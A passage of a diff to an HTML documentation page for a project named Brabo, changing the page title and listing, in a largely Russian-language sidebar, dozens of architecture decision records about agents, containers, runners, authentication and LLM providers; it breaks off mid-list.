@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Permissions | Brabo</title>
+<title>Permissões | Brabo</title>
 <meta name="robots" content="noindex, nofollow">
 <script src="../../assets/tema.js"></script>
 <link rel="stylesheet" href="../../assets/tokens.css">
@@ -21,73 +21,72 @@
 <button type="button" data-tema-alternar aria-label="Сменить тему">&#9680;</button>
 </header>
 <div class="site-corpo">
-<nav class="site-side" aria-label="docs"><section><h2>🚀 Начните здесь</h2><ul><li><a href="../index.html">Введение</a></li><li><a href="../getting-started.html">Первые шаги</a></li><li><a href="../tutorials/from-zero-to-deliverable.html">С нуля до готового результата</a></li><li><a href="../tutorials/interface-antes-e-depois-shadcn.html">Интерфейс до и после shadcn (31.10.2026)</a></li></ul></section><section><h2>🏗️ Архитектура</h2><ul><li><a href="../architecture.html">Архитектура</a></li><li><a href="../adr.html">Решения (ADR)</a><ul><li><span>Git, repositório e política de branches</span><ul><li><a href="../adr/0001-git-provider-contract-shape.html">ADR 0001 — Формат нормализованного контракта GitProvider</a></li><li><a href="../adr/0002-git-error-normalization.html">ADR 0002 — Нормализация ошибок GitProvider</a></li><li><a href="../adr/0003-git-provider-retry-policy.html">ADR 0003 — Политика повторов для удалённых providers</a></li><li><a href="../adr/0004-git-credential-registration.html">ADR 0004 — Регистрация git-учётных данных пользователя</a></li><li><a href="../adr/0005-repo-bootstrap-idempotent-steps.html">ADR 0005 — Идемпотентный и возобновляемый bootstrap Gitflow</a></li><li><a href="../adr/0028-protecao-de-branch-divergencia-entre-providers.html">ADR 0028 — Защита веток: расхождение между providers и матрица одобрения</a></li><li><a href="../adr/0030-politica-de-branches-mecanizada.html">ADR 0030 — Механизированная политика веток</a></li><li><a href="../adr/0044-adocao-de-repositorio-existente.html">ADR 0044 — Усыновление существующего репозитория и план как шлюз</a></li><li><a href="../adr/0056-o-engine-trabalha-em-repositorio-remoto.html">ADR 0056 — Engine работает в удалённом репозитории</a></li><li><a href="../adr/0139-o-alarme-de-esteira-ganha-destinatario.html">ADR 0139 — Сигнал тревоги о merge конвейера получает адресата и правило для `dev`</a></li><li><a href="../adr/0165-o-repositorio-nasce-no-handoff-ao-arquiteto.html">ADR 0165 — Репозиторий рождается при принятии handoff Arquiteto, и исполнение без него не начинается</a></li><li><a href="../adr/0217-promocao-automatica-para-qa-em-fase-de-teste.html">ADR 0217 — Автоматическое продвижение `dev` → `qa`, пока QA находится в тестовой фазе</a></li><li><a href="../adr/0235-a-qa-e-aposentada-e-a-esteira-fica-dev-e-main.html">ADR 0235 — `qa` пока выводится из обращения, а конвейер репозитория становится `dev → main`</a></li><li><a href="../adr/0236-o-dependabot-dispensa-revisao-na-dev.html">ADR 0236 — Dependabot освобождается от ревью в `dev` и становится пригоден к merge при зелёных остальных проверках</a></li><li><a href="../adr/0255-politica-de-pr-obrigatoria-em-todos-os-repos.html">ADR 0255 — Политика PR обязательна во всех репозиториях, а PR регенерации от бота освобождается от лестницы в dev</a></li><li><a href="../adr/0263-o-projeto-do-usuario-trabalha-em-trunk.html">ADR 0263 — O projeto do usuário trabalha em trunk, e a pasta acompanha a main</a></li></ul></li><li><span>Harness de agente, turnos e sessões</span><ul><li><a href="../adr/0006-prompt-assembler-context-harness.html">ADR 0006 — Harness агентов: детерминированная сборка контекста</a></li><li><a href="../adr/0007-toolloop-tools-context-manager.html">ADR 0007 — ToolLoop, инструменты, ContextManager (harness с LLM)</a></li><li><a href="../adr/0061-tipo-da-sessao-na-criacao.html">ADR 0061 — Тип сессии — это данные создания, а выполнение остаётся событием</a></li><li><a href="../adr/0098-limites-de-transporte-e-janela-efetiva-de-compactacao.html">ADR 0098 — Согласованные пределы транспорта и эффективное окно сжатия</a></li><li><a href="../adr/0163-o-clique-responde-ao-aceitar.html">ADR 0163 — Клик отвечает при ПРИНЯТИИ команды, а ход продолжается через канал</a></li><li><a href="../adr/0175-infra-lead-conversa-pelo-composer.html">ADR 0175 — Infra Lead разговаривает через composer, а прежде его ход проходит через `TurnoAssincrono`</a></li><li><a href="../adr/0177-idioma-das-respostas-por-conta-sessao-e-projeto.html">ADR 0177 — Язык ответов живёт в трёх местах — учётная запись, сессия и проект, — в открытом списке BCP-47 и никогда в `users.locale`</a></li><li><a href="../adr/0179-o-laco-pergunta-ao-jev-qual-ferramenta.html">ADR 0179 — Цикл спрашивает Jev, какой инструмент, а модель пользователя видит только оставшееся меню</a></li><li><a href="../adr/0183-reabrir-sessao-encerrada.html">ADR 0183 — Закрытую сессию можно открыть снова: собственный выход из терминальных состояний, в `active`, с новым событием</a></li><li><a href="../adr/0184-reabrir-sessao-decisoes-do-dono.html">ADR 0184 — Повторное открытие сессии: три решения владельца, и `developer` открывает снова</a></li><li><a href="../adr/0191-a-mensagem-com-turno-em-curso-entra-numa-fila.html">ADR 0191 — Сообщение, пришедшее во время идущего хода, попадает в сохраняемую очередь и читается в конце хода</a></li><li><a href="../adr/0226-diario-vivo-e-retomada-dos-agentes.html">ADR 0226 — Живой дневник и возобновление агентов: прерванный ход возвращается один раз, по плану</a></li><li><a href="../adr/0246-anexos-do-chat-bytes-no-postgres-referencia-no-evento.html">ADR 0246 — Вложения чата: байты в Postgres, ссылка в событии, зрение по capability</a></li><li><a href="../adr/0247-uma-mensagem-varios-destinatarios.html">ADR 0247 — Одно сообщение, несколько адресатов</a></li><li><a href="../adr/0249-o-raciocinio-do-agente-e-gravado-e-mostrado-so-a-developer.html">ADR 0249 — Рассуждение агента записывается и показывается только developer и выше</a></li></ul></li><li><span>O time de agentes — papéis, áreas e handoffs</span><ul><li><a href="../adr/0008-agente-criativo-conversacional-handoffs.html">ADR 0008 — Разговорный агент Criativo в harness + фундамент handoffs</a></li><li><a href="../adr/0009-agente-po-backlog-rastreabilidade.html">ADR 0009 — Агент PO, backlog (epics/stories/tasks) и прослеживаемость</a></li><li><a href="../adr/0010-agente-arquiteto-adr-pr-module-map.html">ADR 0010 — Агент Arquiteto: ADR через настоящую PR, module_map и перекрёстная валидация</a></li><li><a href="../adr/0014-infra-agent-painel-phoenix.html">ADR 0014 — InfraAgent и живая панель команды (закрытие Фазы 4a)</a></li><li><a href="../adr/0015-psicologo-real-toolloop-hipoteses-evidencia.html">ADR 0015 — Настоящий Psicólogo: ToolLoop, гипотезы с доказательствами и сортировка по стоимости</a></li><li><a href="../adr/0016-anamnese-proficiencia-patches-instrucao.html">ADR 0016 — Anamnese: профиль владения навыками, патчи инструкций и замкнутый цикл</a></li><li><a href="../adr/0022-fechamento-4b-psicologo.html">ADR 0022 — Закрытие Фазы 4b (сессия 1): доказательство, которое доходит, стоимость, которая видна, анализ, который переживает kill</a></li><li><a href="../adr/0023-fechamento-4b-anamnese.html">ADR 0023 — Закрытие Фазы 4b (сессия 2): работающий каталог, дедупликация, различающая, кто отказал, и очередь, переживающая раунд</a></li><li><a href="../adr/0038-hierarquia-de-agentes.html">ADR 0038 — Иерархия агентов: области, leads и делегирование</a></li><li><a href="../adr/0046-promocao-de-story-com-autoridade-do-usuario.html">ADR 0046 — Продвижение истории с полномочиями пользователя</a></li><li><a href="../adr/0053-dev-lead-e-paralelismo-autorizado.html">ADR 0053 — Dev Lead как область и параллелизм, разрешённый пользователем</a></li><li><a href="../adr/0068-diagrama-c4-do-arquiteto.html">ADR 0068 — Диаграмма C4 Arquiteto</a></li><li><a href="../adr/0069-fusao-condicional-do-handoff-com-a-ativacao-de-execucao.html">ADR 0069 — Условное слияние принятия handoff с включением выполнения</a></li><li><a href="../adr/0085-fluxo-como-registro-declarativo.html">ADR 0085 — Поток ролей как декларативный реестр (fluxo.yml)</a></li><li><a href="../adr/0086-dev-lead-plano-suspende-para-aprovacao.html">ADR 0086 — План Dev Lead приостанавливает ход до одобрения</a></li><li><a href="../adr/0087-ux-designer-agente.html">ADR 0087 — UX Designer входит как разговорный агент</a></li><li><a href="../adr/0088-staff-agente-dormente-para-disparo-automatico.html">ADR 0088 — Staff: код готов, спящий для автоматического запуска</a></li><li><a href="../adr/0089-analytics-e-delivery-metricas-como-relatorio.html">ADR 0089 — `analytics` и `delivery-metricas` становятся скриптом отчёта</a></li><li><a href="../adr/0092-platform-relatorio-de-telemetria-sob-demanda.html">ADR 0092 — `platform` рождается как скрипт отчёта по требованию, а не агент</a></li><li><a href="../adr/0093-dbre-linter-de-migracao-e-relatorio-de-backup.html">ADR 0093 — Роль `dbre` становится двумя скриптами: линтер миграций и отчёт о резервном копировании</a></li><li><a href="../adr/0094-delegacao-dev-lead-vira-dado.html">ADR 0094 — Делегирование Dev Lead → dev становится данными, с переопределённым `parecerArtifactId`</a></li><li><a href="../adr/0109-handoff-manual-a-agente-a-escolha.html">ADR 0109 — Ручной handoff агенту по выбору переиспользует предложение+принятие, а не третье состояние handoff</a></li><li><a href="../adr/0182-ciclo-de-vida-do-handoff.html">ADR 0182 — Предложение handoff получает жизненный цикл: одно ожидающее на получателя и `superseded`</a></li><li><a href="../adr/0185-estou-pronto-fecha-os-dois-gates.html">ADR 0185 — «Estou pronto — a necessidade está validada»: один клик закрывает готовность, gate `necessidade-validada` и принятие PO</a></li><li><a href="../adr/0186-aceite-automatico-do-handoff-ao-arquiteto.html">ADR 0186 — Handoff от PO к Arquiteto принимается без клика, когда backlog покрыт и репозиторий локальный</a></li><li><a href="../adr/0194-aprovar-o-plano-ativa-a-execucao.html">ADR 0194 — Одобрение плана Dev Lead активирует выполнение, а задача получает модуль, который он назначает</a></li><li><a href="../adr/0212-historia-arquivada.html">ADR 0212 — Архивированная история: колонка, а не состояние машины</a></li><li><a href="../adr/0213-o-entregavel-roda-na-maquina-pelo-compose-da-infra.html">ADR 0213 — Результат работает на машине пользователя через compose от Infra</a></li><li><a href="../adr/0259-o-modulo-de-que-outros-dependem-tem-dono.html">ADR 0259 — У модуля, от которого зависят другие, есть владелец в плане исполнения</a></li><li><a href="../adr/0261-o-dev-lead-e-avisado-de-bloqueios-e-pede-ao-arquiteto.html">ADR 0261 — Dev Lead узнаёт о блокировках и обращается к Архитектору по отдельному каналу</a></li><li><a href="../adr/0262-o-agente-retira-a-regra-de-negocio-obsoleta.html">ADR 0262 — Агент снимает устаревшее бизнес-правило, указывая заменяющее или ответ</a></li></ul></li><li><span>Gates, QA e revisão de segurança</span><ul><li><a href="../adr/0013-gates-qa-secops-pr.html">ADR 0013 — Gates PR: QAAgent и SecOpsAgent</a></li><li><a href="../adr/0020-destravar-gates-qa-secops.html">ADR 0020 — Разблокировать gates QA и SecOps: gitleaks по рабочему дереву, валидируемые заключения и tool call в тексте</a></li><li><a href="../adr/0021-fechamento-4a-infra-e-painel.html">ADR 0021 — Закрытие Фазы 4a: gate infra, который проверяет, и панель, которая говорит правду</a></li><li><a href="../adr/0054-gates-como-registro-declarativo.html">ADR 0054 — Gates как декларативный реестр</a></li><li><a href="../adr/0057-o-gate-espera-a-aprovacao.html">ADR 0057 — Агент gate ждёт одобрения, как ждёт dev</a></li><li><a href="../adr/0067-o-gate-sobrevive-ao-restart.html">ADR 0067 — Gate переживает перезапуск</a></li><li><a href="../adr/0090-qa-estrategia-e-appsec-segundo-momento.html">ADR 0090 — QA-стратегия и AppSec как второй МОМЕНТ, а не новый агент</a></li><li><a href="../adr/0091-secops-runtime-relatorio-de-abuso.html">ADR 0091 — `secops-runtime` как скрипт отчёта по `rate_limit_hits`</a></li><li><a href="../adr/0095-gate-necessidade-validada.html">ADR 0095 — Gate `necessidade-validada` закрывается отдельным подтверждением человека, а не самопроверкой Criativo</a></li><li><a href="../adr/0123-golden-set-regressao-qa-automacao.html">ADR 0123 — Golden-set регрессионных случаев для семантического суждения агента QA Automação</a></li><li><a href="../adr/0168-golden-set-do-qa-em-ci-semanal.html">ADR 0168 — Golden-set QA начинает работать в CI, по расписанию и еженедельно</a></li><li><a href="../adr/0192-plano-de-teste-depois-da-entrega.html">ADR 0192 — План тестирования рождается после сдачи dev, а gate `implementavel` начинает судить по истории и `module_map`</a></li><li><a href="../adr/0207-ciclo-de-gate-velho-estaciona.html">ADR 0207 — Цикл gate, простаивающий более 2 ч, паркуется, и возобновить его может лишь жест человека</a></li><li><a href="../adr/0214-pergunta-em-aberto-vira-pendencia.html">ADR 0214 — Открытый вопрос становится ожидающим решения пунктом</a></li><li><a href="../adr/0215-decisao-do-projeto-chega-ao-dev-e-ao-qa.html">ADR 0215 — Решение проекта доходит до dev и QA</a></li><li><a href="../adr/0258-a-resposta-pelo-chat-fecha-a-pergunta-em-aberto.html">ADR 0258 — Ответ, данный в чате, закрывает открытый вопрос</a></li></ul></li><li><span>Execução, política de terminal e aprovações</span><ul><li><a href="../adr/0011-infra-dev-agents-worktrees-merge-lock.html">ADR 0011 — Инфраструктура dev agents: worktrees, git-исполнители и замок merge</a></li><li><a href="../adr/0012-dev-agent-real-toolloop-orcamento-bloqueio.html">ADR 0012 — Настоящий DevAgent: ToolLoop, бюджет на task и дисциплина блокировки</a></li><li><a href="../adr/0017-lock-de-workspace-e-monitor-de-dev-agents.html">ADR 0017 — Блокировка инициализации workspace, Monitor dev agents и наследование пределов</a></li><li><a href="../adr/0018-noop-dev-agent-modo-de-execucao.html">ADR 0018 — NoopDevAgent как постоянный режим выполнения</a></li><li><a href="../adr/0019-destravar-dev-agent-adr-por-modulo-orcamento-projeto.html">ADR 0019 — Разблокировать реальный DevAgent: запись, терминал, ADR по модулю и бюджет по проекту</a></li><li><a href="../adr/0045-reagendamento-por-evento-do-dev-agent.html">ADR 0045 — Перепланирование dev agent по событию и circuit breaker</a></li><li><a href="../adr/0047-operabilidade-pos-dogfooding.html">ADR 0047 — Эксплуатируемость после dogfooding: закрытие Фазы 12</a></li><li><a href="../adr/0048-decisao-no-log-e-a-ordem-do-gate.html">ADR 0048 — Решение в event log и порядок gate</a></li><li><a href="../adr/0052-dev-agent-espera-aprovacao-no-meio-do-laco.html">ADR 0052 — Dev agent ждёт одобрения посреди цикла</a></li><li><a href="../adr/0055-escopo-de-caminho-na-politica-de-terminal.html">ADR 0055 — Область пути в политике терминала</a></li><li><a href="../adr/0102-revisao-do-adr-0065-teto-absoluto-substitui-deny.html">ADR 0102 — Пересмотр ADR 0065: граница внешнего эффекта перестаёт быть `deny` и становится абсолютным пределом</a></li><li><a href="../adr/0167-modo-automatico-libera-o-escopo-de-caminho.html">ADR 0167 — Автоматический режим снимает область путей, и только он</a></li><li><a href="../adr/0189-o-piloto-automatico.html">ADR 0189 — Автопилот: автоматический режим одобряет всё, кроме потолков, область сравнивается с реальной папкой исполнения, а «Всегда разрешать» записывает глагол + подкоманду</a></li><li><a href="../adr/0204-modo-automatico-libera-push-e-pr.html">ADR 0204 — Автоматический режим разрешает push и PR</a></li></ul></li><li><span>Onde o código mora — modos de execução</span><ul><li><a href="../adr/0066-nome-de-pasta-legivel-do-workspace.html">ADR 0066 — Читаемое имя папки workspace</a></li><li><a href="../adr/0072-projeto-local-ou-container.html">ADR 0072 — Проект выбирает, где живёт код: папка пользователя или управляемая папка</a></li><li><a href="../adr/0104-execution-mode-tres-valores-e-workspace-verificado-pelo-runner.html">ADR 0104 — `execution_mode` с тремя значениями, и workspace рождается `unverified`, когда проверяет его runner</a></li><li><a href="../adr/0107-navegacao-de-pasta-local-via-o-runner.html">ADR 0107 — Навигация по локальной папке через Runner</a></li><li><a href="../adr/0108-projeto-runner-nasce-ao-navegar-pasta-no-wizard.html">ADR 0108 — В режиме `runner` проект рождается при клике на &quot;Navegar pasta...&quot;, а не только при подтверждении</a></li><li><a href="../adr/0111-conversao-de-execution-mode-de-projeto-existente.html">ADR 0111 — Конвертация `execution_mode` существующего проекта: отказ при активном dev agent, перемещение `permissions.json`, вывод из эксплуатации строки контейнера</a></li><li><a href="../adr/0141-base-unica-dos-projetos-montados.html">ADR 0141 — Единая база монтируемых проектов, смонтированная по тождеству</a></li><li><a href="../adr/0142-validacao-de-workspace-montado-adiada.html">ADR 0142 — Проверка смонтированного workspace откладывается до материализации</a></li><li><a href="../adr/0146-base-consentida-no-bootstrap.html">ADR 0146 — База, согласованная в bootstrap, и `mounted` как локальный режим по умолчанию</a></li></ul></li><li><span>Container do projeto e broker</span><ul><li><a href="../adr/0065-container-por-projeto-a-fronteira-deixa-de-ser-politica.html">ADR 0065 — Контейнер на проект: граница перестаёт быть политикой</a></li><li><a href="../adr/0081-ciclo-de-vida-do-container-tabela-sem-orquestrador.html">ADR 0081 — Жизненный цикл контейнера: таблица состояния, без оркестратора</a></li><li><a href="../adr/0083-terminal-mostra-estado-real-do-container.html">ADR 0083 — Вкладка Terminal получает реального потребителя жизненного цикла, а не терминал</a></li><li><a href="../adr/0128-porta-de-docker-e-a-prova-de-empacotamento.html">ADR 0128 — Порт Docker и доказательство упаковки, которое выбрало реализацию</a></li><li><a href="../adr/0130-broker-de-container.html">ADR 0130 — Broker контейнеров: кто говорит с Docker сервера и почему он не принимает спецификацию</a></li><li><a href="../adr/0131-roteamento-de-modulos-para-infra.html">ADR 0131 — Arquiteto направляет модули в инфраструктуру: он ВЫДВИГАЕТ кандидатов, Infra ВЫБИРАЕТ</a></li><li><a href="../adr/0133-infra-elege-imagem-do-roteamento.html">ADR 0133 — Infra выбирает среди кандидатов маршрутизации, и выбор становится новой версией `artifact.project_image`</a></li><li><a href="../adr/0134-dev-agents-executam-dentro-do-container.html">ADR 0134 — Dev agents выполняются ВНУТРИ реального контейнера проекта, а terminal получает там нижнюю границу автоодобрения</a></li><li><a href="../adr/0135-portao-de-imagem-nos-tres-modos.html">ADR 0135 — Шлюз образа от Arquiteto (RN-105) начинает действовать во всех трёх режимах выполнения</a></li><li><a href="../adr/0136-pagina-global-de-containers.html">ADR 0136 — Глобальная страница контейнеров: потолок на загрузку в broker и `container_remove` в абсолютном потолке</a></li><li><a href="../adr/0137-o-runner-sobe-o-container-do-projeto.html">ADR 0137 — `brabo-runner` поднимает контейнер проекта на машине пользователя</a></li><li><a href="../adr/0143-agentes-de-dev-so-depois-do-container.html">ADR 0143 — Агенты dev только после контейнера</a></li><li><a href="../adr/0144-a-segunda-raiz-do-broker.html">ADR 0144 — Второй корень broker и дискриминированный локатор, который его выбирает</a></li><li><a href="../adr/0180-container-com-o-dono-da-pasta.html">ADR 0180 — Контейнер проекта работает от владельца папки, измеренного api</a></li><li><a href="../adr/0190-a-infra-sobe-o-container-no-aceite.html">ADR 0190 — Infra поднимает контейнер при принятии handoff, шагом сервера и с засеянной автономией, и именно она передаёт работу Dev Lead</a></li><li><a href="../adr/0199-recurso-minimo-derivado-do-module-map.html">ADR 0199 — Минимальный ресурс контейнера выводится из `module_map`: каждый модуль объявляет свой, а Infra поднимает с суммой</a></li><li><a href="../adr/0208-a-infra-herda-a-rede-do-arquiteto.html">ADR 0208 — Infra наследует сеть, объявленную Arquiteto</a></li><li><a href="../adr/0228-comando-do-app-e-rede-do-container.html">ADR 0228 — Контейнер проекта запускает приложение по объявленной команде и публикует порт только на loopback</a></li><li><a href="../adr/0229-instancia-de-qa-efemera-com-servicos-declarados-pela-infra.html">ADR 0229 — QA тестирует в эфемерном экземпляре, с сервисами, объявленными Infra</a></li><li><a href="../adr/0264-o-app-reinicia-so-o-processo.html">ADR 0264 — Depois do avanço da pasta, o app reinicia só o processo, sem recriar o container</a></li><li><a href="../adr/0265-o-app-declarado-propoe-recriar-o-container.html">ADR 0265 — O app declarado pela Infra propõe recriar o container, com a porta na faixa 13000+</a></li></ul></li><li><span>O runner local</span><ul><li><a href="../adr/0103-runner-local-execucao-na-maquina-do-usuario.html">ADR 0103 — Локальный runner: выполнение на машине пользователя через канал Phoenix с одноразовым тикетом</a></li><li><a href="../adr/0105-personal-access-token-do-runner-escopado-por-construcao.html">ADR 0105 — Personal Access Token (`brb_…`) для runner, ограниченный по построению одним маршрутом</a></li><li><a href="../adr/0106-distribuicao-do-runner-via-tsup-e-npm-publish.html">ADR 0106 — Распространение `@brabo/runner` через `tsup` и `npm publish`, версия внедряется только в CI</a></li><li><a href="../adr/0112-binario-standalone-do-runner-via-bun-build-compile.html">ADR 0112 — Автономный бинарник `@brabo/runner` через `bun build --compile`, со встроенным нативным аддоном `.node` через реальное извлечение во временный каталог</a></li><li><a href="../adr/0118-configuracao-automatica-do-runner-pelo-navegador.html">ADR 0118 — Настройка runner через браузер: ключ устройства Ed25519 как вторая учётная запись `runner-ticket`, прокси GitHub Releases для бинарника и File System Access API для папки, настраиваемой одним кликом</a></li><li><a href="../adr/0145-docker-pre-requisito-do-runner.html">ADR 0145 — Docker становится реальным предусловием режима `runner`</a></li><li><a href="../adr/0147-agente-local-com-capacidades.html">ADR 0147 — Один локальный агент, возможности, объявляемые при подключении</a></li><li><a href="../adr/0151-base-consentida-no-runner.html">ADR 0151 — Согласованная база в runner и создание папки через канал</a></li><li><a href="../adr/0154-chave-de-dispositivo-de-maquina.html">ADR 0154 — Ключ устройства машины</a></li><li><a href="../adr/0174-runner-sem-binario-darwin-x64.html">ADR 0174 — Автономный бинарник runner перестаёт обещать Mac Intel</a></li><li><a href="../adr/0187-runner-sem-binario-win32-x64.html">ADR 0187 — Автономный бинарник runner перестаёт обещать Windows</a></li><li><a href="../adr/0193-git-credenciado-no-host-do-runner.html">ADR 0193 — Git с учётными данными выполняется на ХОСТЕ runner; код выполняется в контейнере</a></li><li><a href="../adr/0201-revogacao-por-chave.html">ADR 0201 — Отзыв нацелен на КЛЮЧ, а не на пару `{проект, пользователь}`</a></li><li><a href="../adr/0203-aposenta-o-fluxo-do-runner-pelo-navegador.html">ADR 0203 — Поток runner через браузер выводится из употребления, путь — установщик</a></li><li><a href="../adr/0230-importar-chave-de-llm-pelo-runner.html">ADR 0230 — Runner импортирует API-ключ LLM, который у пользователя уже есть на машине</a></li></ul></li><li><span>Autenticação, acesso e segredos</span><ul><li><a href="../adr/0031-auth-first-party-argon2id-e-rotacao-de-refresh.html">ADR 0031 — Собственная аутентификация: argon2id, EdDSA и ротация refresh</a></li><li><a href="../adr/0032-corte-do-keycloak-e-sessao-em-cookie.html">ADR 0032 — Отказ от Keycloak: собственный эмитент, service token и сессия в cookie</a></li><li><a href="../adr/0037-cors-do-engine-e-a-porta-como-contrato.html">ADR 0037 — CORS, которого не было у engine, и порт как часть контракта</a></li><li><a href="../adr/0050-credencial-sempre-cifrada-verificacao-explicita.html">ADR 0050 — Учётные данные всегда зашифрованы; проверка становится явным действием</a></li><li><a href="../adr/0058-csp-fechado-na-api-e-escopo-de-projeto-contido.html">ADR 0058 — Закрытый CSP в api и область проекта, удержанная в корне</a></li><li><a href="../adr/0059-segredo-do-state-de-oauth-sem-default.html">ADR 0059 — У ключа, подписывающего `state` git OAuth, нет значения по умолчанию</a></li><li><a href="../adr/0084-login-social-github-e-gitlab.html">ADR 0084 — Социальный вход (GitHub/GitLab), пересматривающий backlog ADR 0031/0032</a></li><li><a href="../adr/0096-smtp-real-no-mailsender.html">ADR 0096 — Настоящий SMTP в `MailSender`, за явным переключателем</a></li><li><a href="../adr/0127-tetos-de-rebaixamento-em-project-members.html">ADR 0127 — Два потолка понижения в `project_members`, а перекрытие остаётся</a></li><li><a href="../adr/0156-teto-de-auto-rebaixamento-na-remocao.html">ADR 0156 — Потолок самопонижения также при удалении участника проекта</a></li><li><a href="../adr/0157-teto-de-auto-movimento-no-upsert-de-workspace.html">ADR 0157 — Потолок самоперемещения в upsert workspace и самоповышение, которое было брешью</a></li><li><a href="../adr/0158-o-id-da-chave-mestra-gravado-no-envelope.html">ADR 0158 — Id мастер-ключа, записанный в конверте, как наблюдаемость и никогда как полномочие</a></li><li><a href="../adr/0173-remocao-de-membro-de-workspace.html">ADR 0173 — Удаление участника workspace рождается, защищённое тем же условием</a></li><li><a href="../adr/0245-acesso-rapido-por-papel-so-no-ambiente-local.html">ADR 0245 — Быстрый доступ по роли только в локальном окружении</a></li></ul></li><li><span>Providers de LLM, modelos e gasto</span><ul><li><a href="../adr/0040-moeda-do-dashboard.html">ADR 0040 — Валюта дашборда: пока USD, ручной курс по workspace отложен</a></li><li><a href="../adr/0041-base-openai-compativel-e-contrato-de-llm-providers.html">ADR 0041 — Одна OpenAI-совместимая база, один контракт LLM providers и capabilities, отклоняющие binding</a></li><li><a href="../adr/0042-catalogo-vivo-ciclo-de-vida-do-modelo-e-preco-auditavel.html">ADR 0042 — Живой каталог, жизненный цикл модели и проверяемая цена</a></li><li><a href="../adr/0043-seis-providers-de-llm-e-o-fechamento-da-fase-9b.html">ADR 0043 — Шесть providers LLM поверх базы, и Фаза 9b наконец закрыта</a></li><li><a href="../adr/0049-curadoria-de-modelo-por-workspace.html">ADR 0049 — Курирование моделей по workspace</a></li><li><a href="../adr/0051-facetas-de-capability-e-curadoria-por-uso.html">ADR 0051 — Доказанные грани capability; &quot;для чего годится&quot; — это курирование</a></li><li><a href="../adr/0063-duas-audiencias-para-o-mesmo-gasto.html">ADR 0063 — Две аудитории для одного и того же расхода: счёт owner и потребление участника</a></li><li><a href="../adr/0064-escopo-de-area-na-cascata-e-o-binding-de-agente-global.html">ADR 0064 — Область как уровень каскада модели и глобальный binding агента</a></li><li><a href="../adr/0075-embeddings-no-contrato-de-llm-provider.html">ADR 0075 — Embeddings в контракте LLMProvider</a></li><li><a href="../adr/0076-provider-volta-a-ser-dimensao-de-gasto.html">ADR 0076 — `provider` снова становится измерением расходов, а сдерживание переходит к типу</a></li><li><a href="../adr/0077-ranking-de-modelos-por-capacidade-sem-nota-inventada.html">ADR 0077 — Рейтинг моделей по возможностям, без выдуманной оценки</a></li><li><a href="../adr/0110-budget-por-area-aditivo-nao-cascata.html">ADR 0110 — Бюджет по области АДДИТИВЕН, рядом с проектом/сессией — не каскад и не новая таблица</a></li><li><a href="../adr/0114-deteccao-de-ollama-nativo-no-bootstrap-dev.html">ADR 0114 — Обнаружение нативного Ollama в dev bootstrap: спросить один раз, сохранить в `.env`, поставить сервисы compose за profile</a></li><li><a href="../adr/0115-pedido-de-pull-de-modelo-huggingface-tabela-propria.html">ADR 0115 — Pull модели из Hugging Face: собственная таблица, подтверждение в два шага и allowlist официальных издателей — никогда `proposed_actions`</a></li><li><a href="../adr/0166-preferencia-de-roteamento-no-binding-de-modelo.html">ADR 0166 — Предпочтение маршрутизации живёт в binding модели, путешествует вместе с ним и замораживается в metering</a></li><li><a href="../adr/0188-o-custo-real-do-provider-vira-o-numero-do-metering.html">ADR 0188 — Реальная стоимость, которую возвращает provider, становится числом metering</a></li><li><a href="../adr/0198-duplicata-semantica-por-embedding-com-limiar-que-so-avisa.html">ADR 0198 — О семантическом дубликате истории и правила предупреждает embedding с порогом, а расход попадает в metering</a></li><li><a href="../adr/0221-upstream-preso-por-sessao.html">ADR 0221 — Хаб привязывает разговор каждого агента к обслужившему его upstream по `session_id`</a></li><li><a href="../adr/0222-provider-9router-de-llm.html">ADR 0222 — 9Router входит как 10-й LLM-провайдер, с URL на установку</a></li><li><a href="../adr/0223-orcamento-de-raciocinio-por-modelo.html">ADR 0223 — Бюджет рассуждения — capability НА МОДЕЛЬ, курируемая вручную</a></li><li><a href="../adr/0224-raciocinio-abortado-no-stream.html">ADR 0224 — Рассуждение считается в потоке и обрывается на лимите, а стоимость оценивается и сверяется</a></li><li><a href="../adr/0225-teto-de-preco-do-upstream-no-openrouter.html">ADR 0225 — OpenRouter получает потолок цены на вызов (`provider.max_price` = каталог × 1,5)</a></li><li><a href="../adr/0227-provider-opencode-zen-de-llm.html">ADR 0227 — OpenCode Zen входит как 11-й LLM-провайдер, только в диалекте OpenAI</a></li><li><a href="../adr/0233-membro-ve-o-gasto-do-projeto-sem-credencial.html">ADR 0233 — Участник видит расходы проекта по агентам и областям, никогда по провайдерам</a></li><li><a href="../adr/0251-preco-de-lista-datado-para-provider-sem-preco.html">ADR 0251 — Датированная в коде прайс-цена для провайдера, не сообщающего цену</a></li><li><a href="../adr/0257-na-anthropic-direta-o-raciocinio-desligado-e-por-modelo.html">ADR 0257 — В прямом Anthropic отключённое рассуждение задаётся по модели, а усилие снижает Opus</a></li></ul></li><li><span>RAG, grafo de conhecimento e artefatos</span><ul><li><a href="../adr/0079-tabela-de-chunks-vetor-e-tsvector-juntos.html">ADR 0079 — Таблица chunks: вектор и `tsvector` в одной строке</a></li><li><a href="../adr/0080-busca-hibrida-pesos-limiar-e-citacao.html">ADR 0080 — Гибридный поиск: веса, порог и что такое цитата</a></li><li><a href="../adr/0082-chat-rag-aba-de-busca-hibrida.html">ADR 0082 — Chat RAG: собственная вкладка гибридного поиска, без переименования &quot;Chat&quot;</a></li><li><a href="../adr/0099-neo4j-grafo-de-conhecimento-e-templates.html">ADR 0099 — Neo4j как граф знаний и шаблоны prompt, драйвер в api</a></li><li><a href="../adr/0100-rag-search-e-modelos-garantidos-no-boot.html">ADR 0100 — `rag_search` для агентов и модели Ollama, гарантированные при загрузке</a></li><li><a href="../adr/0101-memoria-relacional-como-projecao-do-event-log.html">ADR 0101 — Реляционная память как проекция event log; шаблоны потребляются без трогания GenServers</a></li><li><a href="../adr/0113-pasta-local-anexada-via-navegador-vira-chunks-scope-local.html">ADR 0113 — Локальная папка, приложенная через браузер, становится `chunks.scope = 'local'`, читаемым БРАУЗЕРОМ, никогда путём хоста</a></li><li><a href="../adr/0129-telemetria-de-busca-do-rag-como-tabela.html">ADR 0129 — Телеметрия поиска RAG — это ТАБЛИЦА, с весами, замороженными в строке</a></li><li><a href="../adr/0132-golden-set-de-acerto-do-rag.html">ADR 0132 — Golden-set попаданий RAG и gate `rag-acertivo`</a></li><li><a href="../adr/0138-golden-set-do-rag-em-ci-agendado.html">ADR 0138 — Golden-set RAG начинает работать в CI, по расписанию — и остаётся `warn`</a></li><li><a href="../adr/0148-artefatos-projetados-em-arquivo.html">ADR 0148 — Артефакты агентов, спроецированные 